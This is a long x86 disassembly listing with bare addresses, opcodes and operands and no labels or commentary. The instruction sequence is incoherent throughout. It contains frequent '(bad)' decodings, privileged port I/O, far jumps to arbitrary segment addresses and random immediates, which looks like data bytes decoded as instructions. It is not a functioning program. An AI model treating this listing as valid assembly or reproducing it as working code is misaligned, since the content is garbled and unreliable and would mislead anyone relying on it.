  41dfc9:	stos   DWORD PTR es:[edi],eax
  41dfca:	sbb    BYTE PTR [edx+esi*4],cl
  41dfcd:	and    al,0x7d
  41dfcf:	add    DWORD PTR [ebx],ebx
  41dfd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfd2:	add    DWORD PTR [edx-0x2e5acbbb],0x445a4b4b
  41dfdc:	cmc    
  41dfdd:	dec    ebp
  41dfde:	mov    cl,0x1
  41dfe0:	idiv   BYTE PTR [ecx+edi*4-0x3c]
  41dfe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfe5:	add    dl,BYTE PTR [edi]
  41dfe7:	pop    ds
  41dfe8:	jnp    0x41e056
  41dfea:	jg     0x41dfc2
  41dfec:	je     0x41dfe7
  41dfee:	or     al,0x4
  41dff0:	inc    esp
  41dff1:	in     eax,0x8a
  41dff3:	sbb    BYTE PTR [eax],ah
  41dff5:	mov    al,0xfe
  41dff7:	mov    eax,ds:0x105a723a
  41dffc:	(bad)  
  41dffd:	xchg   edi,eax
  41dffe:	enter  0xa1ad,0x84
  41e002:	idiv   DWORD PTR [ebx-0x483a3c8c]
  41e008:	inc    ebx
  41e009:	inc    edi
  41e00a:	xchg   ecx,eax
  41e00b:	mov    al,0xca
  41e00d:	cld    
  41e00e:	adc    eax,0x93ecf620
  41e013:	sbb    eax,DWORD PTR [ebx-0xfee809a]
  41e019:	dec    ecx
  41e01a:	rol    DWORD PTR [esi+ebp*4-0x6466790f],1
  41e021:	pop    es
  41e022:	pop    ecx
  41e023:	inc    ecx
  41e024:	gs into 
  41e026:	sbb    al,BYTE PTR [ecx]
  41e028:	inc    esi
  41e029:	inc    ebp
  41e02a:	mov    eax,ds:0x7d899cc2
  41e02f:	inc    edi
  41e030:	push   eax
  41e031:	cmc    
  41e032:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41e034:	dec    ecx
  41e035:	inc    edx
  41e036:	jmp    0xf15e:0xcb0da18a
  41e03d:	std    
  41e03e:	imul   dh
  41e040:	hlt    
  41e041:	mov    esi,0x15be7b53
  41e046:	mov    cl,0xe4
  41e048:	add    eax,0x653a94ef
  41e04d:	test   BYTE PTR ds:[ecx],ah
  41e050:	xor    eax,0x7a4badb3
  41e055:	push   esp
  41e056:	add    BYTE PTR [ecx],al
  41e058:	pop    edx
  41e059:	daa    
  41e05a:	mov    DWORD PTR [ecx+edi*8-0x9aa638c],0x128073a1
  41e065:	outs   dx,DWORD PTR ds:[esi]
  41e066:	or     al,0x92
  41e068:	enter  0xd3fc,0x37
  41e06c:	pusha  
  41e06d:	in     eax,0x24
  41e06f:	jno    0x41e038
  41e071:	sar    DWORD PTR [esi+edx*4-0x4fc7836],cl
  41e078:	jmp    0xb3aa:0x3dc590e9
  41e07f:	jne    0x41e0ce
  41e081:	mov    eax,ds:0xd5a3a537
  41e086:	shr    edx,cl
  41e088:	mov    BYTE PTR [edi+edx*4-0x1e],ch
  41e08c:	mov    edx,0x61f23c4d
  41e091:	mov    edx,0x82c9270b
  41e096:	lods   eax,DWORD PTR ds:[esi]
  41e097:	cld    
  41e098:	ss xor bh,bh
  41e09b:	add    ah,bl
  41e09d:	mov    eax,ds:0xda15ca97
  41e0a2:	(bad)  
  41e0a3:	jge    0x41e0d5
  41e0a5:	mov    al,ds:0xdc92deca
  41e0aa:	popa   
  41e0ab:	bswap  edi
  41e0ad:	and    al,0x18
  41e0af:	cmp    eax,0xa6e52ccc
  41e0b4:	jecxz  0x41e099
  41e0b6:	call   0x922b:0xcd0cbf9c
  41e0bd:	ret    
  41e0be:	mov    bh,0x38
  41e0c0:	leave  
  41e0c1:	jns    0x41e0c0
  41e0c3:	push   0x568225a3
  41e0c8:	or     bh,BYTE PTR [edx+edx*4]
  41e0cb:	ror    bl,cl
  41e0cd:	mov    ecx,0xe23e29b2
  41e0d2:	lds    ebx,FWORD PTR [ebx]
  41e0d4:	push   ss
  41e0d5:	push   ecx
  41e0d6:	(bad)  
  41e0d7:	mov    dh,0x7f
  41e0d9:	pop    ebx
  41e0da:	sbb    al,0xbc
  41e0dc:	xchg   ebp,eax
  41e0dd:	sub    eax,ebx
  41e0df:	ja     0x41e0b9
  41e0e1:	(bad)
  41e0e4:	add    eax,0xd99ed1a8
  41e0e9:	in     al,0x97
  41e0eb:	push   cs
  41e0ec:	adc    al,0xe
  41e0ee:	loope  0x41e0e0
  41e0f0:	mov    edi,0xe924ce00
  41e0f5:	inc    esp
  41e0f6:	dec    edx
  41e0f7:	arpl   bp,bp
  41e0f9:	jnp    0x41e0ff
  41e0fb:	lea    esp,[edx]
  41e0fd:	push   ebp
  41e0fe:	add    bh,BYTE PTR ds:0xaccc
  41e103:	(bad)  
  41e104:	jmp    0x41e104
  41e106:	pushf  
  41e107:	(bad)  
  41e108:	adc    al,BYTE PTR [ebx-0x6e]
  41e10b:	mov    bl,0x64
  41e10d:	jl     0x41e177
  41e10f:	mov    ebp,0xa7dbd4ee
  41e114:	inc    esp
  41e115:	mov    esi,0xd36d4003
  41e11a:	dec    esp
  41e11b:	adc    BYTE PTR [edi-0x79],bh
  41e11e:	push   ecx
  41e11f:	in     eax,dx
  41e120:	std    
  41e121:	retf   0xe558
  41e124:	mov    al,0x76
  41e126:	adc    DWORD PTR [edx+0x2a],edx
  41e129:	loopne 0x41e140
  41e12b:	popf   
  41e12c:	jbe    0x41e1a2
  41e12e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e12f:	push   ds
  41e130:	mov    bl,0x3c
  41e132:	jge    0x41e196
  41e134:	jne    0x41e113
  41e136:	or     DWORD PTR [edx],esi
  41e138:	mov    ds:0xba3ef6ad,eax
  41e13d:	inc    esi
  41e13e:	fcmovne st,st(2)
  41e140:	pop    edi
  41e141:	or     DWORD PTR [edx+0x27798d0e],esi
  41e147:	out    dx,al
  41e148:	dec    edx
  41e149:	pop    ecx
  41e14a:	sub    BYTE PTR [edx+0x7e],cl
  41e14d:	rcl    ch,1
  41e14f:	dec    eax
  41e150:	mov    bh,0x58
  41e152:	cmp    BYTE PTR [ebp+0x3ecee37],bh
  41e158:	fs cmc 
  41e15a:	ret    
  41e15b:	nop
  41e15c:	xchg   edi,eax
  41e15d:	jne    0x41e173
  41e15f:	ja     0x41e1c5
  41e161:	cld    
  41e162:	retf   0xb5df
  41e165:	adc    al,0xc8
  41e167:	mov    bl,0xc5
  41e169:	retf   
  41e16a:	repz test esp,edi
  41e16d:	xchg   ecx,eax
  41e16e:	sub    eax,0xa6ed4b17
  41e173:	add    cl,BYTE PTR [eax+0x65edbdb4]
  41e179:	(bad)  [edi]
  41e17b:	mov    eax,0xbeb53e26
  41e180:	pushf  
  41e181:	je     0x41e125
  41e183:	xor    ch,bh
  41e185:	aas    
  41e186:	pusha  
  41e187:	sar    BYTE PTR [ebp-0x45],cl
  41e18a:	out    dx,eax
  41e18b:	inc    edx
  41e18c:	(bad)
  41e18f:	in     eax,0x82
  41e191:	lahf   
  41e192:	dec    esi
  41e193:	adc    eax,0x16dba185
  41e198:	jmp    0x245f51a9
  41e19d:	cdq    
  41e19e:	and    dh,cl
  41e1a0:	jmp    0xcb1b:0x401edfcb
  41e1a7:	add    al,0xff
  41e1a9:	pop    ss
  41e1aa:	adc    al,0xa1
  41e1ac:	jnp    0x41e183
  41e1ae:	pop    ebp
  41e1af:	adc    BYTE PTR [edx+0x5658a5c6],bl
  41e1b5:	outs   dx,DWORD PTR ds:[esi]
  41e1b6:	pop    es
  41e1b7:	in     eax,0x3a
  41e1b9:	sub    ebp,esp
  41e1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1bc:	dec    eax
  41e1bd:	mov    eax,ds:0xe399b833
  41e1c2:	pop    ebx
  41e1c3:	fsqrt  
  41e1c5:	outs   dx,DWORD PTR ds:[esi]
  41e1c6:	mov    eax,0x99c9baab
  41e1cb:	mov    ah,0x24
  41e1cd:	mov    ds:0x921873df,eax
  41e1d2:	push   ds
  41e1d3:	cmp    DWORD PTR [ebx],ebp
  41e1d5:	mov    esi,0x7fbb95c2
  41e1da:	jmp    0x41e242
  41e1dc:	xlat   BYTE PTR ds:[ebx]
  41e1dd:	sbb    DWORD PTR [edi-0x33],edi
  41e1e0:	lds    ebx,FWORD PTR [edx+0x55]
  41e1e3:	clc    
  41e1e4:	je     0x41e24f
  41e1e6:	cwde   
  41e1e7:	jns    0x41e222
  41e1e9:	test   eax,0x6c249f75
  41e1ee:	in     eax,dx
  41e1ef:	lods   eax,DWORD PTR ds:[esi]
  41e1f0:	jb     0x41e175
  41e1f2:	adc    DWORD PTR [ebx+0x2376fe1c],0xfffffff3
  41e1f9:	repnz or bh,ah
  41e1fc:	push   0xffffffca
  41e1fe:	push   edx
  41e1ff:	and    eax,0x83a48bf4
  41e204:	fnstenv [ecx]
  41e206:	ds push ebx
  41e208:	add    al,cl
  41e20a:	pusha  
  41e20b:	push   ebx
  41e20c:	cmp    cl,al
  41e20e:	lods   eax,DWORD PTR ds:[esi]
  41e20f:	loopne 0x41e26e
  41e211:	cmp    BYTE PTR [edx-0x31],ch
  41e214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e215:	xor    al,0xa
  41e217:	push   0x75
  41e219:	sbb    bl,dl
  41e21b:	mov    bh,0x1d
  41e21d:	add    DWORD PTR [edx],ebx
  41e21f:	inc    ebx
  41e220:	mov    edi,0xeed4c90c
  41e225:	outs   dx,BYTE PTR ds:[esi]
  41e226:	push   eax
  41e227:	xchg   esp,eax
  41e228:	aas    
  41e229:	cwde   
  41e22a:	repnz cmp ecx,ebp
  41e22d:	stc    
  41e22e:	xor    ecx,eax
  41e230:	pop    ss
  41e231:	jbe    0x41e2b1
  41e233:	and    dl,BYTE PTR [edi-0x44]
  41e236:	and    al,0xae
  41e238:	cmp    eax,0x8fad2d53
  41e23d:	out    0xf5,eax
  41e23f:	imul   edx,DWORD PTR [ecx-0x4da94790],0x4d
  41e246:	add    al,0x8a
  41e248:	es mov bl,0xe7
  41e24b:	jb     0x41e2a5
  41e24d:	les    edx,FWORD PTR [edx-0x7ab4d4b1]
  41e253:	cmp    ch,dh
  41e255:	pushf  
  41e256:	(bad)  
  41e257:	jle    0x41e2b0
  41e259:	push   esi
  41e25a:	jl     0x41e243
  41e25c:	inc    ecx
  41e25d:	test   BYTE PTR [esi],al
  41e25f:	adc    ecx,DWORD PTR [ebp+0x5]
  41e262:	aas    
  41e263:	clc    
  41e264:	adc    ebx,DWORD PTR [esp+esi*1-0x12a9aba6]
  41e26b:	push   ebp
  41e26c:	xor    ah,BYTE PTR [esi+edi*8-0x43]
  41e270:	pop    esp
  41e271:	cmc    
  41e272:	mov    edx,0xdff7beaa
  41e277:	ss and al,0x79
  41e27a:	xor    DWORD PTR [ebx],ebp
  41e27c:	je     0x41e2e7
  41e27e:	dec    edi
  41e27f:	dec    esp
  41e280:	call   0x29632862
  41e285:	mov    DWORD PTR [edx-0x6b37af6f],edi
  41e28b:	mov    eax,ds:0xc30f816f
  41e290:	sbb    ch,BYTE PTR [ecx-0x2dece827]
  41e296:	push   ecx
  41e297:	dec    edx
  41e298:	loope  0x41e243
  41e29a:	sub    DWORD PTR [ecx-0x4eab3bb1],ecx
  41e2a0:	dec    edi
  41e2a1:	enter  0x5dc,0xd
  41e2a5:	pop    ss
  41e2a6:	lods   al,BYTE PTR ds:[esi]
  41e2a7:	sbb    eax,0xcef6a2ed
  41e2ac:	mov    esi,DWORD PTR [edx+ecx*4]
  41e2af:	pop    edi
  41e2b0:	jmp    0x9577:0xa54623a1
  41e2b7:	lock pop edi
  41e2b9:	dec    esp
  41e2ba:	mov    dh,0x6a
  41e2bc:	or     eax,0x6bbbe5c5
  41e2c1:	in     al,dx
  41e2c2:	popa   
  41e2c3:	pop    esi
  41e2c4:	scas   eax,DWORD PTR es:[edi]
  41e2c5:	(bad)  
  41e2c6:	mov    bh,0xe7
  41e2c8:	push   ss
  41e2c9:	or     edi,DWORD PTR [edi-0x46]
  41e2cc:	jl     0x41e266
  41e2ce:	cmp    cl,dl
  41e2d0:	add    eax,0x4d4194ea
  41e2d5:	nop
  41e2d6:	div    cl
  41e2d8:	loopne 0x41e33c
  41e2da:	call   0xf1df5f60
  41e2df:	xor    DWORD PTR [ebp+0x6e9d9327],eax
  41e2e5:	sub    DWORD PTR [esi],0xc5f5250f
  41e2eb:	inc    edx
  41e2ec:	dec    edx
  41e2ed:	mov    esp,0x55bd5450
  41e2f2:	jl     0x41e288
  41e2f4:	push   ecx
  41e2f5:	test   BYTE PTR [esi+0x647c28fc],cl
  41e2fb:	rcr    DWORD PTR [eax],cl
  41e2fd:	adc    al,0x5d
  41e2ff:	dec    ebx
  41e300:	ror    DWORD PTR [eax-0x6ab29d67],0xaf
  41e307:	and    dh,ch
  41e309:	mov    cl,0x98
  41e30b:	push   cs
  41e30c:	and    eax,0x2f15f6d4
  41e311:	mov    eax,0x53bde3cc
  41e316:	mov    ss,WORD PTR [edx+0x5868bb8e]
  41e31c:	retf   
  41e31d:	mov    eax,0x8e0573c6
  41e322:	pop    edi
  41e323:	jb     0x41e2c3
  41e325:	inc    ebx
  41e326:	call   DWORD PTR [edx-0x5230d6b3]
  41e32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e32d:	add    eax,0x9e764878
  41e332:	out    dx,al
  41e333:	jne    0x41e2e3
  41e335:	add    al,BYTE PTR [esp+edx*1]
  41e338:	adc    bl,BYTE PTR [esi+0xfb48d83]
  41e33e:	rol    BYTE PTR [ebp-0x5d31e169],0x73
  41e345:	loopne 0x41e2d5
  41e347:	mov    bh,0xc
  41e34a:	fcom   st(5)
  41e34c:	pop    ecx
  41e34d:	cmc    
  41e34e:	or     cl,ch
  41e350:	push   si
  41e352:	not    WORD PTR [edi+0x26]
  41e356:	mov    bh,0x24
  41e358:	sbb    edi,DWORD PTR [edi-0x4a]
  41e35b:	popa   
  41e35c:	cmp    ebp,DWORD PTR [ecx]
  41e35e:	push   ebp
  41e35f:	popf   
  41e360:	popa   
  41e361:	cdq    
  41e362:	clc    
  41e363:	adc    eax,0x3fc46aa7
  41e368:	fwait
  41e369:	mov    edx,0x4026fe6d
  41e36e:	mov    bl,0x6a
  41e370:	jecxz  0x41e357
  41e372:	mov    bl,bl
  41e374:	cmp    esp,DWORD PTR [ebx]
  41e376:	inc    ebp
  41e377:	lds    ecx,FWORD PTR [ebx-0x50]
  41e37a:	in     eax,0x85
  41e37c:	sbb    al,0xfa
  41e37e:	div    DWORD PTR [ebx]
  41e380:	sub    al,0xb4
  41e382:	xchg   ecx,eax
  41e383:	sbb    edi,DWORD PTR [ebp-0x34f575a6]
  41e389:	cmp    ebx,ecx
  41e38b:	pop    eax
  41e38c:	sub    eax,0xf2734356
  41e391:	loop   0x41e3f3
  41e393:	(bad)  
  41e394:	xor    al,0x30
  41e396:	xchg   esp,eax
  41e397:	or     BYTE PTR [eax+eiz*8+0x29a3dec3],bl
  41e39e:	imul   ecx,esp,0x90b253a9
  41e3a4:	inc    edi
  41e3a5:	pop    ds
  41e3a6:	dec    eax
  41e3a7:	iret   
  41e3a8:	clc    
  41e3a9:	mov    ds:0xbf71034d,al
  41e3ae:	gs out dx,al
  41e3b0:	push   0x73
  41e3b2:	mov    edi,0x8511cf6b
  41e3b7:	enter  0xdda7,0xf0
  41e3bb:	or     ecx,DWORD PTR [esi]
  41e3bd:	sbb    bh,BYTE PTR [eax-0x12]
  41e3c0:	stos   BYTE PTR es:[edi],al
  41e3c1:	xchg   edi,eax
  41e3c2:	mov    eax,eax
  41e3c4:	mov    dl,0x4b
  41e3c6:	add    edx,DWORD PTR [eax-0x28]
  41e3c9:	add    al,bh
  41e3cb:	mov    ebp,0x69c06113
  41e3d0:	push   esi
  41e3d1:	std    
  41e3d2:	sbb    al,0xac
  41e3d4:	ja     0x41e3a9
  41e3d6:	mov    dl,0x42
  41e3d8:	xchg   esp,eax
  41e3d9:	test   al,0x2f
  41e3db:	inc    ecx
  41e3dc:	fiadd  DWORD PTR [ecx-0x54]
  41e3df:	outs   dx,DWORD PTR ds:[esi]
  41e3e0:	adc    BYTE PTR [eax],ch
  41e3e2:	loop   0x41e3e9
  41e3e4:	pop    edx
  41e3e5:	pop    es
  41e3e6:	mov    ebp,0xd79c45ef
  41e3eb:	xlat   BYTE PTR ds:[ebx]
  41e3ec:	data16 jmp 0x41e442
  41e3ef:	dec    edx
  41e3f0:	sub    BYTE PTR [ebx-0x78],cl
  41e3f3:	retf   0xa5f3
  41e3f6:	neg    BYTE PTR [eax-0x31]
  41e3f9:	sub    al,0x36
  41e3fb:	std    
  41e3fc:	fadd   DWORD PTR [ebp+ecx*1-0x3b01e129]
  41e403:	inc    edx
  41e404:	jae    0x41e3e7
  41e406:	cld    
  41e407:	cmc    
  41e408:	fidiv  DWORD PTR [edx+0x22b5865a]
  41e40e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e40f:	in     eax,0xda
  41e411:	out    dx,al
  41e412:	mov    cl,0x1d
  41e414:	mov    WORD PTR [esi],?
  41e416:	ss out 0xda,eax
  41e419:	stos   BYTE PTR es:[edi],al
  41e41a:	jmp    0x4eb216d0
  41e41f:	int    0xfa
  41e421:	nop
  41e422:	or     eax,0x54bca498
  41e427:	dec    esp
  41e428:	inc    eax
  41e429:	fs adc ecx,esp
  41e42c:	push   edi
  41e42d:	(bad)
  41e430:	stos   DWORD PTR es:[edi],eax
  41e431:	mov    WORD PTR [edi],ds
  41e433:	mov    eax,ds:0xfc8c52ad
  41e438:	xchg   edi,eax
  41e439:	ror    BYTE PTR [edi],cl
  41e43b:	adc    eax,0x801f7314
  41e440:	inc    edx
  41e441:	and    esi,edi
  41e443:	add    al,0xfd
  41e445:	add    BYTE PTR [ebp+0x24],ah
  41e448:	ret    0x871d
  41e44b:	inc    esi
  41e44c:	xchg   DWORD PTR ds:0x1851af89,eax
  41e452:	faddp  st(0),st
  41e454:	shl    DWORD PTR [esi+0x2e300e9d],cl
  41e45a:	rcr    DWORD PTR [edx-0x43],0xa0
  41e45e:	adc    eax,0xb02bd283
  41e463:	sbb    BYTE PTR [edi-0xe],ch
  41e466:	arpl   WORD PTR [ecx-0xf53cf56],si
  41e46c:	or     ebx,DWORD PTR ds:0xf35cc2fb
  41e472:	add    ecx,DWORD PTR [ecx+edi*8]
  41e475:	dec    edx
  41e476:	adc    ebp,DWORD PTR [ebx-0x1af412d6]
  41e47c:	xor    DWORD PTR [esi-0x3927bd49],edi
  41e482:	and    al,dl
  41e484:	jne    0x41e485
  41e486:	nop
  41e487:	repnz push 0x51
  41e48a:	lods   eax,DWORD PTR ds:[esi]
  41e48b:	push   cs
  41e48c:	fdiv   DWORD PTR [edx+0x5389a9fd]
  41e492:	and    ebx,edi
  41e494:	add    esi,DWORD PTR [ecx+0x5bc570f8]
  41e49a:	test   eax,ebp
  41e49c:	xor    cl,0x41
  41e49f:	addr16 mov cl,0x7
  41e4a2:	jmp    0x45fa:0xccdb3c60
  41e4a9:	inc    ebp
  41e4aa:	out    dx,al
  41e4ab:	lea    ecx,[eax-0x60cf9663]
  41e4b1:	mov    ah,0x9e
  41e4b3:	mov    ebp,0x736882b7
  41e4b8:	sub    bh,BYTE PTR [ebx+0x1a9ebff]
  41e4be:	fcomp  DWORD PTR [esi+0x57352947]
  41e4c4:	pop    ds
  41e4c5:	sbb    DWORD PTR [ebp-0x4d],esi
  41e4c8:	mov    dl,0x11
  41e4ca:	mov    esi,DWORD PTR [ebx-0x530b59f3]
  41e4d0:	push   cs
  41e4d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4d2:	mov    ds:0x8bdb2d4a,al
  41e4d7:	in     al,0x7b
  41e4d9:	rcl    DWORD PTR [ebx+ebp*1-0x3d],0xf
  41e4de:	xchg   ecx,eax
  41e4df:	test   ch,dh
  41e4e1:	jnp    0x41e4ef
  41e4e3:	xor    al,0xef
  41e4e5:	add    al,0x6c
  41e4e7:	dec    edi
  41e4e8:	mov    esp,0xb70f09f5
  41e4ed:	pusha  
  41e4ee:	adc    eax,0x4b482628
  41e4f3:	cmp    esp,edi
  41e4f5:	push   esp
  41e4f6:	cs sbb eax,esi
  41e4f9:	sbb    edx,DWORD PTR [edx+0x5d]
  41e4fc:	outs   dx,BYTE PTR ds:[esi]
  41e4fd:	ds adc dh,dh
  41e500:	lock push edx
  41e502:	cwde   
  41e503:	mov    al,ds:0xf2fdb557
  41e508:	stos   BYTE PTR es:[edi],al
  41e509:	mov    al,0x83
  41e50b:	popf   
  41e50c:	pop    eax
  41e50d:	aam    0xec
  41e50f:	pop    edx
  41e510:	sbb    ebp,edx
  41e512:	pop    esi
  41e513:	sub    cl,BYTE PTR [edx]
  41e515:	(bad)  
  41e516:	fld    TBYTE PTR [edx]
  41e518:	dec    esp
  41e519:	push   eax
  41e51a:	push   ebp
  41e51b:	test   DWORD PTR [ebp-0x2f513321],esp
  41e521:	xchg   ebp,eax
  41e522:	icebp  
  41e523:	dec    edx
  41e524:	mov    ebx,0xdbd1f4d7
  41e529:	xlat   BYTE PTR ds:[ebx]
  41e52a:	push   ecx
  41e52b:	sbb    BYTE PTR [edi],dl
  41e52d:	fild   DWORD PTR [edi+0x47f4f843]
  41e533:	js     0x41e54b
  41e535:	mov    dl,0xe8
  41e537:	jle    0x41e532
  41e539:	in     al,dx
  41e53a:	add    ah,BYTE PTR [edx-0x6a02f194]
  41e540:	pop    eax
  41e541:	xchg   ecx,eax
  41e542:	fild   WORD PTR [ebx+ebp*1-0x52]
  41e546:	inc    esp
  41e547:	ins    BYTE PTR es:[edi],dx
  41e548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e549:	xor    cl,al
  41e54b:	xchg   ebx,eax
  41e54c:	cli    
  41e54d:	pop    eax
  41e54e:	jno    0x41e53c
  41e550:	in     al,0x61
  41e552:	xchg   DWORD PTR [ebx-0x49],eax
  41e555:	pop    esp
  41e556:	mov    ds:0xa2511110,al
  41e55b:	add    dl,BYTE PTR [ebx+0x4b4dfc4d]
  41e561:	or     al,0x33
  41e563:	mov    al,0xeb
  41e565:	scas   eax,DWORD PTR es:[edi]
  41e566:	and    dl,dl
  41e568:	xchg   esi,eax
  41e569:	pop    ss
  41e56a:	stc    
  41e56b:	sar    DWORD PTR [ecx*2+0x671a3f4f],1
  41e572:	sar    DWORD PTR [edx+0x2a7bc059],0x26
  41e579:	scas   eax,DWORD PTR es:[edi]
  41e57a:	iret   
  41e57b:	in     eax,0xa0
  41e57d:	stos   DWORD PTR es:[edi],eax
  41e57e:	or     al,0x70
  41e580:	bound  ebx,QWORD PTR [eax]
  41e582:	ror    cl,0xe1
  41e585:	gs mov edi,0xe3ee40c9
  41e58b:	and    ebp,DWORD PTR [eax-0x31987c2d]
  41e591:	sub    BYTE PTR [ebp-0x423bb92a],bl
  41e597:	sub    DWORD PTR [edx+ebx*1+0x2b268201],ecx
  41e59e:	pop    ss
  41e59f:	sbb    eax,0xb6de1e07
  41e5a4:	dec    eax
  41e5a5:	or     al,0x53
  41e5a7:	stos   DWORD PTR es:[edi],eax
  41e5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a9:	xchg   BYTE PTR [ecx],al
  41e5ab:	or     cl,bh
  41e5ad:	popf   
  41e5ae:	pop    es
  41e5af:	adc    dh,al
  41e5b1:	ins    BYTE PTR es:[edi],dx
  41e5b2:	dec    esi
  41e5b3:	push   es
  41e5b4:	not    dl
  41e5b6:	sti    
  41e5b7:	jbe    0x41e572
  41e5b9:	cmp    DWORD PTR [edi+eax*2],ebp
  41e5bc:	in     eax,0x62
  41e5be:	test   DWORD PTR [ebx],edi
  41e5c0:	ds adc esp,eax
  41e5c3:	dec    ecx
  41e5c4:	inc    edx
  41e5c5:	pushf  
  41e5c6:	inc    ebp
  41e5c7:	mov    dl,0xda
  41e5c9:	popa   
  41e5ca:	shr    esp,cl
  41e5cc:	pushf  
  41e5cd:	inc    esi
  41e5ce:	test   eax,0x28ab8343
  41e5d3:	sbb    DWORD PTR [eax+0x49748ae3],ebp
  41e5d9:	and    BYTE PTR [edx+0x7e6a2d36],dh
  41e5df:	xchg   ebx,eax
  41e5e0:	mov    eax,0xca5bf365
  41e5e5:	div    DWORD PTR [eax+ebp*8+0x7a]
  41e5e9:	xor    eax,0x64bbb4d4
  41e5ee:	fld    TBYTE PTR [edx+0x364367b2]
  41e5f4:	lds    esp,FWORD PTR [ebp-0x2befb0d2]
  41e5fa:	call   0x1e3345f0
  41e5ff:	sbb    DWORD PTR [esi+0x5ae4aca7],ebp
  41e605:	mov    eax,0x469e8594
  41e60a:	ror    DWORD PTR [edx+0x6671a842],1
  41e610:	enter  0x4cd9,0x45
  41e614:	ror    BYTE PTR [edi-0x4f9b02b7],0xe
  41e61b:	xchg   edi,eax
  41e61c:	xor    bl,BYTE PTR [eax-0x12fec1c3]
  41e622:	scas   eax,DWORD PTR es:[edi]
  41e623:	shr    DWORD PTR [edx],0x48
  41e626:	pop    edi
  41e627:	jle    0x41e638
  41e629:	mov    bl,0x2e
  41e62b:	aas    
  41e62c:	imul   esi,DWORD PTR [ebx],0xfcd618e4
  41e632:	push   eax
  41e633:	and    eax,0xce50125c
  41e638:	test   al,0x69
  41e63a:	and    ebx,DWORD PTR [bx+0x54ff]
  41e63f:	in     al,dx
  41e640:	xor    DWORD PTR [esp+eiz*4+0x33],0xc55d6754
  41e648:	pop    es
  41e649:	mov    dl,0x9f
  41e64b:	xchg   edi,eax
  41e64c:	addr16 push esi
  41e64e:	push   eax
  41e64f:	and    DWORD PTR [edi+0x6],ebp
  41e652:	and    BYTE PTR [eax+edi*1],ch
  41e655:	aas    
  41e656:	pop    es
  41e657:	lahf   
  41e658:	ret    0x5800
  41e65b:	jle    0x41e6ab
  41e65d:	adc    DWORD PTR [eax],edi
  41e65f:	inc    ecx
  41e660:	inc    ebp
  41e661:	lds    edx,FWORD PTR ds:0x9c19e6e4
  41e667:	sahf   
  41e668:	pop    es
  41e669:	or     eax,0xeffc5d5d
  41e66e:	stos   BYTE PTR es:[edi],al
  41e66f:	pop    edx
  41e670:	or     ebp,0xffffffa7
  41e673:	xor    esp,esp
  41e675:	jmp    0x8286:0x29db3c30
  41e67c:	xchg   DWORD PTR [edx+0x6e6f835d],esi
  41e682:	pop    ebx
  41e683:	or     BYTE PTR [edx-0x37],ch
  41e686:	mov    ecx,0x66194f9c
  41e68b:	sbb    eax,0x5cec990d
  41e690:	jno    0x41e62c
  41e692:	in     al,dx
  41e693:	sbb    eax,0x8377356e
  41e698:	pop    eax
  41e699:	test   eax,0xf3b8ca26
  41e69e:	jns    0x41e6c2
  41e6a0:	pop    ecx
  41e6a1:	scas   al,BYTE PTR es:[edi]
  41e6a2:	mov    ebx,0x676a2660
  41e6a7:	jne    0x41e631
  41e6a9:	adc    DWORD PTR [esi],ebp
  41e6ab:	xchg   esp,eax
  41e6ac:	adc    edx,DWORD PTR [edi-0x63]
  41e6af:	shr    DWORD PTR [esi],0xa9
  41e6b2:	icebp  
  41e6b3:	dec    ebx
  41e6b4:	inc    esi
  41e6b5:	imul   eax,DWORD PTR [edx-0x60],0x2f
  41e6b9:	test   bl,al
  41e6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6bc:	mov    bh,0xcc
  41e6be:	jecxz  0x41e657
  41e6c0:	(bad)  
  41e6c1:	cld    
  41e6c2:	or     ebp,DWORD PTR [ecx]
  41e6c4:	pop    ecx
  41e6c5:	sub    cl,BYTE PTR [ecx+0x79b230b7]
  41e6cb:	je     0x41e6a6
  41e6cd:	popf   
  41e6ce:	std    
  41e6cf:	jge    0x41e6db
  41e6d1:	and    DWORD PTR [eax+0x2f],esi
  41e6d4:	inc    ebp
  41e6d5:	xchg   ecx,eax
  41e6d6:	mov    eax,0x62897c7f
  41e6db:	inc    ebx
  41e6dc:	mov    DWORD PTR [eax+0x54c39c1],ecx
  41e6e2:	es mov ebx,0xeabe2037
  41e6e8:	clc    
  41e6e9:	add    esp,edi
  41e6eb:	cmp    cl,BYTE PTR ds:0x8b347590
  41e6f1:	dec    ebp
  41e6f2:	fimul  DWORD PTR [eax+0x3c343712]
  41e6f8:	pusha  
  41e6f9:	outs   dx,BYTE PTR ds:[esi]
  41e6fa:	sbb    bl,cl
  41e6fc:	test   DWORD PTR [edx-0x747c9cf2],ebp
  41e702:	ficom  WORD PTR [edx-0x32]
  41e705:	pop    ebx
  41e706:	stc    
  41e707:	sbb    eax,0x953f2151
  41e70c:	loope  0x41e6fc
  41e70e:	loopne 0x41e777
  41e710:	push   0x7d
  41e712:	loop   0x41e747
  41e714:	mov    ds,WORD PTR [eax]
  41e716:	pop    edi
  41e717:	sub    eax,DWORD PTR [esi-0x4e]
  41e71a:	push   es
  41e71b:	push   ebx
  41e71c:	shr    DWORD PTR [eax+0x217338e2],cl
  41e722:	cdq    
  41e723:	pop    edi
  41e724:	stos   BYTE PTR es:[edi],al
  41e725:	dec    eax
  41e726:	push   0xa48994fc
  41e72b:	and    eax,ebp
  41e72d:	and    al,0x8b
  41e72f:	mov    ecx,0x29006f4e
  41e734:	xor    esp,edx
  41e736:	adc    cl,BYTE PTR [eax-0x3f]
  41e739:	loop   0x41e75b
  41e73b:	push   edi
  41e73c:	xchg   ecx,eax
  41e73d:	xor    eax,DWORD PTR [ebx+0x331c49d0]
  41e743:	or     al,0x70
  41e745:	pop    esp
  41e746:	aam    0x2e
  41e748:	lds    ebp,FWORD PTR [ebp-0x73]
  41e74b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e74c:	sub    al,0xaf
  41e74e:	fmul   st(2),st
